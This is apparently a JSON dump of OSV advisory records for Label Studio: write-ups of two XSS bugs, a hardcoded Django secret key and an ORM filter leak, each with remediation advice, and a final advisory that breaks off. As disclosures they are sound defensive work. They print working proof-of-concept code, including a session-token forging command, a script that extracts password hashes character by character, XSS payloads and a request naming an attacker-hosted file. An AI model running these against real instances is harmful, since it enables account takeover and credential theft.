DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  